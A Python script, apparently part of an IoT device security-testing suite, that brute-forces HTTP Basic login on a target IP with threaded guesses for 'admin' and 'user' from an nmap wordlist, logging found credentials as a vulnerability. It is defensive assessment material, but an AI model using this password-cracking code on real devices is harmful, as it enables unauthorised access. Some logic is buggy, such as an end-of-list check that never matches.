import time
import requests, urllib.request
import os, sys
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
	dir_path = os.path.dirname(os.path.realpath(__file__))
	parent_dir_path = os.path.abspath(os.path.join(dir_path, os.pardir))
	sys.path.insert(0, parent_dir_path)

	from aidingScripts import generalVariables
	TestFailed = generalVariables.TestFailedToLaunch
	DeviceNotSecure= generalVariables.DeviceIsntSecure
	DeviceIsSecure= generalVariables.DeviceIsSecure
	TestNotApplicable = generalVariables.TestNotApplicable
	resultsDir = generalVariables.resultsDirWIFI
	temporaryFiles = generalVariables.temporaryFiles
	testsDir=generalVariables.testsDir	

except Exception as e:
	print(e)
	TestFailed =  "Test failed"
	DeviceNotSecure = "Vulnerable"
	DeviceIsSecure ="Not Vulnerable"
	TestNotApplicable ="Not Applicable"
	resultsDir ="results/WiFi"
	
	




def StartAttack():
	global start_time
	# open file to read
	filePath = os.path.join(testsDir, "nmap.lst" )
	with open(filePath,'r') as fread:
		lines = fread.read()
		#read line by line
		lines  = lines.split("\n")
		start_time = time.time()


		BruteForceThreshold = 50
		checkThreshold = True
		passwordTried = 0 
		
		for username in ["admin", "user"]:
			for line in lines:
				time.sleep(0.1)
				
				passwordTried  = passwordTried + 1
				
				if checkThreshold:
					if passwordTried > BruteForceThreshold:
						checkThreshold = False
						
				PasswordCracker(username,  line).start()

			#if all the file was over, and we didnot find the file
			if line == lines[:-1]:
				testResult= DeviceIsSecure
				testResult2 = "The password was not found with username : [ " +username+" ] "
				printoutResults(testResult, testResult2)



class PasswordCracker(Thread):
	def __init__(self, username, passwd):
		super(PasswordCracker, self).__init__() 
		self.passwd = passwd
		self.username = username

	def run(self):
		global start_time
		try:
			
			r=requests.get(url, auth=(self.username,  self.passwd)) 	
			#print(str(r.status_code)+"   "+self.username + " ... "+self.passwd )
			if r.status_code == 200:
				global passFound
				passFound = True
				global testResult
				global testResult2
				testResult = DeviceNotSecure	
				testResult2 ="Found correct Username:Password: [ "+ str(self.username)+" : " +str(self.passwd)+" ]"
				testResult2 = testResult2 + " In {:.3f} minutes".format((time.time() - start_time) / 60) 
				
				printoutResults(testResult, testResult2)
				os._exit(1)
			r.close()
			print(str(r.status_code))
		except Exception as e: 
			testResult = DeviceIsSecure	
			testResult2 ="The device got disconnected or detected the DoS/BruteForce and refused the connection"
			printoutResults(testResult, testResult2)			
			os._exit(1)


def printoutResults(testResult, testResult2):
	print("Tests results are : ")
	print(testResult)			
	print(testResult2)	
	try:
		filePath= os.path.join(resultsDir,DeviceMAC,"HTTPBruteForce_Summary" )
		with open (filePath , "w") as fout: 
			fout.write(testResult)		
			fout.write("\n")
			fout.write(testResult2)
	except():
		pass
	
	
threads = []

IP= sys.argv[1]
DeviceName=  sys.argv[2]
DeviceMAC=  sys.argv[3]

testResult = TestNotApplicable
testResult2 = ".."
passFound = False
url = 'http://'+IP
start_time = 0
		
try: #try to get HTML page
	handle = urllib.request.urlopen(url)
	print ("THere is a webpage")
	
	testResult = TestNotApplicable
	testResult2 = "The device has a webpage" 
	printoutResults(testResult, testResult2)


except urllib.error.HTTPError as e:
	if e.code == 101 : #network issue!
		print("There is a network issue")
		testResult = TestFailed
		testResult2="There is a network issue" 
		printoutResults(testResult, testResult2)

	elif e.code  == 113 : #the device is not connected to LAN anymore!
		testResult = TestFailed
		testResult2= "The device is not connected to LAN anymore"				
		printoutResults(testResult, testResult2)

	elif e.code == 111 : #Connection refused
		testResult = TestNotApplicable
		testResult2= "The device doesnt have a webserver"	
		printoutResults(testResult, testResult2)

	elif e.code == 401: #authenticaiton is requrired 
		print("Authenticaiton is requrired ")
		try:
			r=requests.get(url, auth=("USER","PASSWD")) 
			time.sleep(1)
			testResult =  StartAttack()
		except IOError as e:
			print("Error: ", e)
			printoutResults(testResult, testResult2)

	else:
		testResult = TestFailed
		testResult2=f"Error encountered: [{e.code}] {e.msg}"
		printoutResults(testResult, testResult2)	

except urllib.error.URLError as e:

	if "library" in e.reason.__dict__:
		if  e.reason.library  == 'SSL':
			testResult = DeviceIsSecure
			testResult2="The device is using SSL"
			printoutResults(testResult, testResult2)	
	else:
		testResult = TestFailed
		testResult2=str(e.reason)
		printoutResults(testResult, testResult2)			
